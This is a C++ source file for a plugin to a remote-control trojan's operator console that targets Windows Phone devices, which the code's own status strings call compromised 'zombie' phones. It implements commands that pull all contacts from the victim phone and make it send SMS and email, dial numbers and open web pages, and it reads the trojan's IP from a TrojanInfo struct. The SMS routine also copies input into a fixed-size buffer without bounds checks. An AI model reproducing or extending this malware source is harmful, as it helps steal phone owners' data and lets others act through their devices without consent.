#include "StdAfx.h"
#include "WPhonePlugin.h"
#include "PluginDoc.h"
#include "SendMessage.h"
#include "EmailForm.h"
#include "ContactForm.h"
#include "macro.h"
#include "conn.h"

HINSTANCE	g_hInstance;

conn lastS = 0;
conn currS = 0;

WPhonePlugin::WPhonePlugin()
{
	strcpy(m_plugInfo.sAuthor, "greatyao");
	strcpy(m_plugInfo.sName, "Windows Phone手机插件");
	strcpy(m_plugInfo.sDesc, "Windows Phone手机远程工具");
	m_plugInfo.uReserved = 0x0100;
}

WPhonePlugin::~WPhonePlugin()
{
}

void WPhonePlugin:: OnCreateDocTemplate()
{
	m_contact_docTemp = new CMultiDocTemplate(GetMinResId() + 1, RUNTIME_CLASS(PluginDoc),
		RUNTIME_CLASS(CMDIChildWnd), RUNTIME_CLASS(ContactForm));
	ISite::AddDocTemplate(m_contact_docTemp);

	m_sms_docTemp = new CMultiDocTemplate(GetMinResId() + 1, RUNTIME_CLASS(PluginDoc),
		RUNTIME_CLASS(CMDIChildWnd), RUNTIME_CLASS(SendMessageForm));
	ISite::AddDocTemplate(m_sms_docTemp);

	m_email_docTemp = new CMultiDocTemplate(GetMinResId() + 1, RUNTIME_CLASS(PluginDoc),
		RUNTIME_CLASS(CMDIChildWnd), RUNTIME_CLASS(EmailForm));
	ISite::AddDocTemplate(m_email_docTemp);
}


void WPhonePlugin::OnCreateFrameMenu(CMenu* pMenu)
{
	static CMenu pop;
	pop.CreatePopupMenu();

	pop.AppendMenu(MF_STRING, GetMinResId() + 2, "获取联系人");
	pop.AppendMenu(MF_STRING, GetMinResId() + 3, "发送短消息");
	pop.AppendMenu(MF_STRING, GetMinResId() + 4, "拨打电话");
	pop.AppendMenu(MF_STRING, GetMinResId() + 5, "发送电子邮件");
	pop.AppendMenu(MF_STRING, GetMinResId() + 6, "浏览网页");

	pMenu->GetSubMenu(2)->AppendMenu(MF_POPUP, (UINT_PTR)pop.m_hMenu, "Windows Phone工具");
}

void WPhonePlugin::OnCreateFrameToolBar(ToolBarData* pArr,UINT& count)
{
	pArr->uIconId = IDB_BITMAP_CONTACTS;
	pArr->uId = GetMinResId() + 2;
	strcpy(pArr->sName, "查看联系人");	
	strcpy(pArr->sTip, "获取手机里面所有联系人");	
	pArr++;

	pArr->uIconId = IDB_BITMAP_SMS;
	pArr->uId = GetMinResId() + 3;
	strcpy(pArr->sName, "发送短消息");	
	strcpy(pArr->sTip, "通过手机发送短信息给某人");	
	pArr++;

	pArr->uIconId = IDB_BITMAP_CALL;
	pArr->uId = GetMinResId() + 4;
	strcpy(pArr->sName, "拨打电话");	
	strcpy(pArr->sTip, "拨打电话");	
	pArr++;

	pArr->uIconId = IDB_BITMAP_EMAIL;
	pArr->uId = GetMinResId() + 5;
	strcpy(pArr->sName, "发送Email");	
	strcpy(pArr->sTip, "用手机发送电子邮件");	
	pArr++;

	pArr->uIconId = IDB_BITMAP_WEB;
	pArr->uId = GetMinResId() + 6;
	strcpy(pArr->sName, "浏览网页");	
	strcpy(pArr->sTip, "通过手机网页浏览器打开某个网址");	
	pArr++;

	count = 5;
}

void WPhonePlugin::OnCommand(UINT uId)
{
	if (uId == GetMinResId() + 2)
	{
		ISite::CreateFrameWnd(m_contact_docTemp, RUNTIME_CLASS(ContactForm), "查看联系人");

		if(currS && currS != lastS)
			ISite::SendCmd(CONTROL_QUERY_CONTACTS, currS, NULL, 0);
	}
	else if (uId == GetMinResId() + 3)
	{
		ISite::CreateFrameWnd(m_sms_docTemp, RUNTIME_CLASS(SendMessageForm), "发送短消息");
	}
	else if (uId == GetMinResId() + 4)
	{
		//ISite::CreateFrameWnd(m_docTemp, RUNTIME_CLASS(SendMessageForm), "拨打电话");
	}
	else if (uId == GetMinResId() + 5)
	{
		ISite::CreateFrameWnd(m_email_docTemp, RUNTIME_CLASS(EmailForm), "发送电子邮件");
	}
	else if (uId == GetMinResId() + 6)
	{
		//ISite::CreateFrameWnd(m_docTemp, RUNTIME_CLASS(SendMessageForm), "浏览网页");
	}
}

int WPhonePlugin::NavigateToSMS(const char* to)
{
	ISite::CreateFrameWnd(m_sms_docTemp, RUNTIME_CLASS(SendMessageForm), "发送短消息");

	SendMessageForm* pWnd = (SendMessageForm*)GetActiveWnd(m_sms_docTemp);
	if(pWnd)
	{
		pWnd->OnClear();
		pWnd->SetReceiver(to);
	}

	return 0;
}

int WPhonePlugin::NavigateToCall(const char* to)
{
	return 0;
}

int WPhonePlugin::NavigateToEmail(const char* to)
{
	ISite::CreateFrameWnd(m_email_docTemp, RUNTIME_CLASS(EmailForm), "发送电子邮件");

	EmailForm* pWnd = (EmailForm*)GetActiveWnd(m_email_docTemp);
	if(pWnd)
	{
		pWnd->OnClear();
		pWnd->SetReceiver(to);
	}

	return 0;
}

void WPhonePlugin::OnCreateDockPane(DockPane* pArr,UINT& count)
{	
	count = 0;
}

CWnd* WPhonePlugin::GetActiveWnd(CMultiDocTemplate* doc)
{
	CWnd* pView = NULL;
	POSITION posdoc = doc->GetFirstDocPosition();
	while(posdoc != NULL)
	{
		CDocument* pdoc = doc->GetNextDoc(posdoc);
		POSITION posview = pdoc->GetFirstViewPosition();
		pView = (pdoc->GetNextView(posview));
	}

	return pView;
}

void WPhonePlugin::OnNotify(UINT id, WPARAM wp, LPARAM lp)
{
	if(wp == NULL)	return;

	if(id == ZCM_SEL_OBJ)//选择了新的目标机
	{
		STANDARDDATA* pSD = (STANDARDDATA*)wp;
		if(currS == pSD->s)	return;
		
		lastS = currS;
		currS = pSD->s;
	}
	else if(id == ZCM_WM_OFFLINE)
	{
		STANDARDDATA* pSD = (STANDARDDATA*)wp;
	}
	else if(id == ZCM_RECV_MSG)//收到目标机的发送回来的消息
	{
		DispatchData* data = (DispatchData*)wp;
		control_header* header = data->recvData.header;
		unsigned short cmd = header->command;
		unsigned short resp = header->response;
		void* s = data->s;
		ProcessResp(s, header->command, header->response, header->seq, 
			data->recvData.body, header->dataLen);
	}
}

void WPhonePlugin::ProcessResp(void* s, int cmd, int resp, unsigned short seq, void* data, int len)
{
	if(cmd < CONTROL_QUERY_CONTACTS || cmd > CONTROL_BROWSER)
		return;

	if(resp == 0)
	{
		if(cmd == CONTROL_QUERY_CONTACTS)
		{
			ContactForm* pWnd = (ContactForm*)GetActiveWnd(m_contact_docTemp);
	
			if(pWnd == NULL)	return;

			if(seq == -1 || len <= 0)	return;
			if(seq == 0 || seq == 1)	pWnd->ClearAll();
			pWnd->Insert(seq, data);
		}
		else if(cmd == CONTROL_SEND_MESSAGE)
		{
			SendMessageForm* pWnd = (SendMessageForm*)GetActiveWnd(m_sms_docTemp);
			if(pWnd)	pWnd->OnClear();

			struct TrojanInfo info;
			ISite::Service(ZCM_GET_OBJ, (WPARAM)s, (LPARAM)&info);
			CString addr = ISite::GetIPAddrPort(info.trojanip, info.port);
			ISite::SetStatus(0, "肉鸡手机%s接受到发送短消息请求...", addr);
		}
		else if(cmd == CONTROL_DIAL_NUMBER)
		{
		}
		else if(cmd == CONTROL_SEND_EMAIL)
		{
			EmailForm* pWnd = (EmailForm*)GetActiveWnd(m_email_docTemp);
			if(pWnd)	pWnd->OnClear();

			struct TrojanInfo info;
			ISite::Service(ZCM_GET_OBJ, (WPARAM)s, (LPARAM)&info);
			CString addr = ISite::GetIPAddrPort(info.trojanip, info.port);
			ISite::SetStatus(0, "肉鸡手机%s接受到发送Email请求...", addr);
		}
		else if(cmd == CONTROL_BROWSER)
		{
		}
		else if(cmd == CONTROL_CAMERA)
		{
		}
	}
}

BOOL WPhonePlugin::OnInitalize()
{
	return TRUE;
}

BOOL WPhonePlugin::OnUninitalize()
{
	return TRUE;
}

void WPhonePlugin::OnCommandUI(CCmdUI* pCmdUI)
{
}

int WPhonePlugin::SendMessage(const char* to, const char* body)
{
	if(currS == 0)
	{
		AfxMessageBox("手机用户不在线!", MB_ICONERROR);
		return -1;
	}

	int len =  strlen(to) + strlen(body) + 1;
	char msg[140+16+1] = {0}, *p = msg;

	strcpy(p, to);
	p += strlen(p);
	p += 1; 
	
	strcpy(p, body);
	
	ISite::SendCmd(CONTROL_SEND_MESSAGE, currS, msg, len);
	
	return 0;
}

int WPhonePlugin::SendEmail(const char* to, const char* subject, const char* body)
{
	if(currS == 0)
	{
		AfxMessageBox("手机用户不在线!", MB_ICONERROR);
		return -1;
	}

	int len =  strlen(to) + strlen(body) + strlen(subject) + 2;
	char* msg = new char[len], *p = msg;
	memset(msg, 0, len);

	strcpy(p, to);
	p += strlen(p);
	p += 1; 
	
	strcpy(p, subject);
	p += strlen(p);
	p += 1; 
	
	strcpy(p, body);	

	ISite::SendCmd(CONTROL_SEND_EMAIL, currS, msg, len);
	
	delete []msg;
	
	return 0;
}

int WPhonePlugin::CallNumber(const char* to)
{
	if(currS == 0)
	{
		AfxMessageBox("手机用户不在线!", MB_ICONERROR);
		return -1;
	}

	ISite::SendCmd(CONTROL_DIAL_NUMBER, currS, (char*)to, strlen(to));
	
	return 0; 
}

int WPhonePlugin::BrowseWeb(const char* to)
{
	if(currS == 0)
	{
		AfxMessageBox("手机用户不在线!", MB_ICONERROR);
		return -1;
	}

	ISite::SendCmd(CONTROL_BROWSER, currS, (char*)to, strlen(to));
	
	return 0;
}